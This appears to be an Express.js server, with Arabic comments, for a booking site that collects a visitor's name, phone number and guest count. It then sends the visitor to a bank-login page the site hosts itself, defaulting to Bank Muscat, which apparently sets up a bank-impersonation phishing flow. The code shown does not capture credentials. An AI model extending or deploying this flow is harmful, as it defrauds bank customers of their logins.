const express = require("express");
const bodyParser = require("body-parser");
const app = express();

app.set("view engine", "ejs");
app.use(express.static("public"));
app.use(bodyParser.urlencoded({ extended: true }));

// الصفحة الرئيسية
app.get("/", (req, res) => {
    res.render("index");
});

// صفحة الحجز
app.get("/booking", (req, res) => {
    res.render("booking");
});

// استقبال بيانات الحجز
app.post("/booking", (req, res) => {
    const { name, phone, guests } = req.body;
    res.render("payment", { name, phone, guests });
});

// صفحة الدفع
app.get("/payment", (req, res) => {
    res.render("payment");
});

// استقبال اختيار البنك
app.post("/payment", (req, res) => {
    const bank = req.body.bank;
    res.render("bank-login", { bank });
});

// صفحة تسجيل الدخول للبنك
app.get("/bank-login", (req, res) => {
    res.render("bank-login", { bank: "بنك مسقط" });
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`الخادم يعمل على http://localhost:${PORT}`);
});